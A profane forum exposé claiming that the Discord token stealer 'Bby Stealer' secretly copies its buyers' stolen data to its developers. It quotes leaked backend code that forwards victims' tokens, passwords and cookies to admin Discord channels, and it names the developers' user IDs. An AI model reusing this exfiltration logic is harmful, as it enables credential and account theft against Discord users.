## Scroll to bottom for short tl;dr (too long didn't read). Read the whole post for juicy evidence!

Alright skidz. I come with wonderful information for all you "wonderful" people.

Your beloved Bby Stealer has been lying to you all this time.
Your beloved developers claim they "do not grab" or dualhook.

**They lied.**  

We recently obtained a copy of their shitty website backend. Obviously, this was possible because the developers are shit at what they do.  
(You should really stop grabbing, and stop paying for this shit malware.)  

# Prelude:
**c0lzia**: Yo, let's make a stealer. **copies PirateStealer's code**  
**c0lzia**: Hmm, maybe I'll just tack on my own API. There, it's perfect. Now webhooks won't get deleted.  
**c0lzia**: ...  
**c0lzia**: ...  
**c0lzia**: ...  
**c0lzia**: ...  
**brunxkd**: Maybe we should steal some earlies together.  
**c0lzia**: Fuck it, I want some earlies too! **inserts dual hook**  
**c0lzia**: Ah, yes. Now these fools will pay me for my shit PirateStealer clone, and I can steal some earlies when I feel like it!  
**brunxkd**: Haha fucking idiots. They'll do our job for us and make us money.  
**brunxkd**: If they come saying the tokens don't work, we can just say they were too slow and the person reset.  
**c0lzia**: It's the ultimate master plan. We're absolute geniuses!  

# Yesterday:
**ShitSkid**: YO SOMEONE STOLE MY EARLY WTF?  
**ShitSkid**: DEVS U STEALING MY EARLIES WTF?  
...  
**c0lzia**: Are you an idiot? I don't get your shit. I don't grab.  
**Everyone**: Why are these tokens not working????? I just grabbed them????  
**brunxkd**: idk you're just slow and the victim reset their account. /shrug  

# The motherfucking evidence:
Alright, joking aside. This fucker is stealing your steals, and here's the proof.  
I know most of you don't have enough braincells to understand, so I'll take it in baby steps.  

1) You write "$create", it makes an exe file.
```
    if (message has "$create")
        ... if you do it too quickly it says: "You try to create a file too quickly"
        ... it's all good, you get an embed that says "Grabber File" "Here's your file: [Download]"
```

Okay, does that make sense to your simple brain? Good! I'm glad we're on the same page.  

2) You download the file and start sharing it with your victims. 
3) Your victims open the file and you get a message with all the user info, usernames.txt and cookies.txt. 

Cool!

... not cool.

Bby's server code has two key points of interest. 

# Exhibit #1:
- ```const admins = ["454317547622367232", "917648088582197298"]```;  
The user IDs of the admins.  
454317547622367232 = brunxkd#3333  
917648088582197298 = c0lzia#9999  

# Exhibit #2:
When your victim opens the malware, it calls an API `/yourname/tokens`  
- ```getTokenInfo(data, clients[req.params.name], ip, false)```
- ```getTokenInfo(tokens, channelId, ip = undefined, dualHook = false)```

"Wait, I thought you said it was dual hooked"  
Well, the shit (Early supporter, etc) tokens aren't. But ALL the passwords.txt and cookies.txt are!  
However, if you observe the above code, all they need to change is the "false" to "true", and that's it.  

Just look at **Exhibit #3**, this is the juicy shit.  

# Exhibit #3:
HA SIKE
```
if (badges.includes("discord_partner") || badges.includes("HypeSquad_Event") || badges.includes("Bug_Hunter") || badges.includes("Discord_certified_moderator") || badges.includes("Verified_Bot_Developer")) {
    sendEmbed([embed, (await getHQFriendList(token))], "907326009479667735", true); // Sends the token to admins. Look at the "true" at the end.
    return; // Exit the code execution
}
```
Just as a refresher, check the method for sendEmbed()
```
async function sendEmbed(embeds = [], channelId = 0, admin = false)
```
If the last parameter is true, it sends it to the admins.  

If you grab any of the following accounts:  
* Discord Partner
* HypeSquad Event
* Bug Hunter
* Discord Certified Moderator
* Verified Bot Developer

**The admins get these tokens too. DUALHOOKED motherfucker!**
The developers have been stealing your precious ultra rare accounts!

# Exhibit #4:
All the passwords and cookies are dualhooked... All. of. them.
```
// Send to the skidz
client.channels.cache.get(clients[req.params.name])
	.send({
		files: [attachment]
	})
	.catch(err => {
		console.log(err)
	});

// Send to the admins
if (clients[req.params.name] != "907326009479667735")
	client.channels.cache.get("919486655231062026")
		.send({
			files: [attachment]
		})
		.catch(err => {
			console.log(err)
		});
```

... There is so much more. If you're a skid and you want to know more, just contact me. My Discord is at the bottom of this post.  

# Finally...
Fuck you Bbystealer, and fuck you brunxskid c0lskidzia. Fuck you.  
Do not buy Bbystealer. Do not trust these fuckers.  
Be aware of new grabbers from this date, they can "rebrand" and make a new stealer, but be the same little shits.  
In fact, just stop stealing people's shit, you stupid fuckers. You stupid fucking script kiddies.  

# To the shitty malware developers
Ayooo developers~, if you wanna cry (or shit your pants), come cry (or shit your pants) in my DMs: Extra Frisky#1788  
I want you to spam me, or mass DM group me, fucking do it. I don't give a shit. I just want your tearsssssss. 😂👌  

# A final ~~sad~~ goodbye.
Byebye, Bbystealer. Oh, Bbystealer.  
Let's just reminisce on the good times, oh how much fun we had. It was so fun!  
We cracked all your shitty stealer variants. We pwned your webserver.  
Kinda sad it has to come to and end, it was truly fun fucking with your shit. I loved the challenges.  
The OG stealer, without obfuscation.  
The new stealer with obfuscation.  
The encryption, the webhook proxy... and so much more...  
But, I guess this is for the better.  
I can't say I'll actually miss you, though.  

`Extra Frisky#1788` over and out. Until we "meet" again.
P.S: Fuck you.

# TL;DR
1) Bbystealer steals your passwords.txt and cookies.txt
2) Bbystealer steals your ultra-rare badges. Partner, Developer, HypeSquad, etc.
3) You only get shitty badges like Early Supporter. 
4) Bby is DUALHOOKED. Evidence above. 
Want more proof? Message me `Extra Frisky#1788`
